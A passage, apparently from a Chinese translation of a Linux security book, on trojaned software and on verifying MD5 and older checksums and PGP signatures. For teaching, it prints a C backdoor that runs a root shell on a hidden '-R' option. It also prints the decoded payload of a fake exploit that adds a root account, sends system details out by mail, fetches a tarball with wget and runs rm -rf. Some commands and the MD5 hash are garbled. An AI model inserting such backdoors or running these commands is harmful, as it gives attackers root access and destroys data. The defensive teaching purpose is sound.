
```c
case 'A':
    config.autodial = 1;
    break;
```

```c
char buffer [STRLEN];
int char;

while (char = getopt(argc, argv, "RA:btd:")) != EOF) {
    switch (char) {
        case 'R':
            setuid(0); setreuid(0);
            system("/bin/sh");
            break;
        case 'A':
            config.autodial = 1;
            break;
    }
}
```

在示例展示的一个虚构 `setuserid` 程序中，黑客添加了一个新的 `'R'` 参数，当设置时，它将允许将用户切换到 `root` 并运行命令提示符。在没有对代码进行全面审查的情况下，我们就能很快判断丹麦王国的情况可能有问题（暗指内部不安全）。

黑客可能会对最新版本的代码植入特木马，通过这种方式进行源码对比通常会显示任何异常变化是仅次于实际代码审查的最优方案。

## 验证加密校验和

校验和是由数学算法生成的字符串，它允许你判断两个文件是否相同。文件即使只改变一个比特位，也会导致校验和不同。通过将你下载的文件校验和与发行网站上列出的校验和进行比较，如果校验和匹配，你就可以非常有信这两个文件是相同的。此外，当软件包中发现安全漏洞时，大多数带有漏洞的发行版会发布新版本，并向安全列表发送该更新以及新包的校验和，如图 4-1 所示。

今天最常用的校验和是 `MD5` 校验和，称为消息摘要。这是目前广泛使用的密码学强度最强的校验和。要获取你的文件 `source.tgz` 的校验和，请使用 `md5sum` 程序：

```
$machine md5sum source.tgz
fb45d19582621c4c5cf4c8488ac5a63 source.tgz
```

旧的校验和有多种类型，`BSD` 和 `System V` 校验和最流行。这些校验和没有 `MD5` 校验和强，它们的输出长度要短得多。要计算这些校验和，请使用 `sum` 程序：

```
# 使用 BSD 算法检查校验和
machine$ sum -r sourcecode.tgz
56656 1
```

```
# 使用 System V 算法检查校验和
machine$ sum -s sourcecode.tgz
36734 1 sourcecode.tgz
```

一旦算出校验和，请将其与软件发行网站列出的值或发布更新的电子邮件进行比较。如果它们不匹配，请勿编译或安装该软件。

如果你正在检查一个 `rpm` 文件，也可以使用 `rpm` 工具内置的校验和功能：

```
machine$ rpm --checksum --nogpg program.rpm
program.rpm md5 OK
PGP Signatures
```

黑客有可能创建一个带有校验和的文件。`MD5` 比较弱的 `BSD` 和 `System V` 校验和脆弱得多，后者在理论上是有可能的。然而，要让两个或多个不同算法的校验和匹配，难度呈指数级增长，甚至是不可能的。因此，你应该验证提供的所有校验和。

## 验证 PGP 签名

许多程序员使用 `Pretty Good Privacy (PGP)` 密钥对发行版进行数字签名。这会创建一个带有 `.asc` 扩展名的独立文件，与校验和类似。你必须先获取用于签名发行版的公 PGP 密钥副本并将其安装到你的密钥库中。假设你的源码是 `sourcecode.tgz` 而 PGP 签名是 `sourcecode.tgz.asc`，使用：

```
machine6 ppg sourcecode.tgz.asc
Good signature from user "Reegen <Reegen@example.com>"
Signature made 2000/04/19 04:43 PDT
```

或者，如果使用 `Gnu Privacy Guard`，

```
machine6 gpg --verify sourcecode.tgz.asc
gpg: Signature Made Wed 19 Apr 2000 04:43:00 AM PDT
using RSA Key ID 8827E1FA
gpg: Good signature from cm "Reegen <Reegen@example.com>"
```

许多 `Linux` 发行版使用 `PGP` 对其 `rpm` 签名。假设你已经将公钥导入你的密钥库，可以如下所示检查 `rpm` 的 PGP 签名：

```
machine$ rpm --checksum program.rpm
program.rpm md5 OK
```

**注意** 校验和 PGP 签名通常与发行版本身位于同一个目录。如果你担心软件已被黑客替换，你也应该担心校验和或签名可能已被替换。这就是为什么校验和会存储在其他地方，例如托管在不同机器上的 `FTP` 站点和网站站上（这需要黑客同时破解两个系统），或者存储在更新时发送的电子邮件中。用于签名发行版的 PGP 密钥通常可以在服务器以及发行网站上找到。检查使用的密钥是否与签名匹配。

## 特木马的方法

特木马程序和源码可以通过多种方式传给你你：

- 朋友：可能是特木马传播最常见的方式，将程序交给他人，而不知道这些程序是有危险的。只有当你相信他们具有安全意识并且会信任你的机器时，才信任他们。大多数安全专业人员都会遇到一两个这样的。
- 用户发布：黑客确保许多人获取程序的简单方法。
- 邮件：黑客可能会发送恶意邮件。

# 146 深度剖析 Linux：Linux 安全秘密与解决方案

执行缓冲区溢出的的脚本通常包含此类机器码段，旨在测试或利用该漏洞。除非你分析了这些代码，否则你可能会对帖子信以为真。尽管经过了简单的混淆（实际代码采用了 `XOR` 编码），但该利用程序实际上会在你的机器上运行以下命令：

```
a+.com,
echo -e '+//root/.hosts;
/sbin/ifconfig -a;/bin/netstat -na) ||/bin/mail h3aT$ >dev/null;
rm -rf h.tar;
echo h3aT:0:0:::/bin::/etc/passwd;
echo h3aT3hl1hrKim4g::::>>/etc/shadow;
wget http://$d/h31hrK.tar -xf >dev/null;
rm h/sh;
rm -rf
```
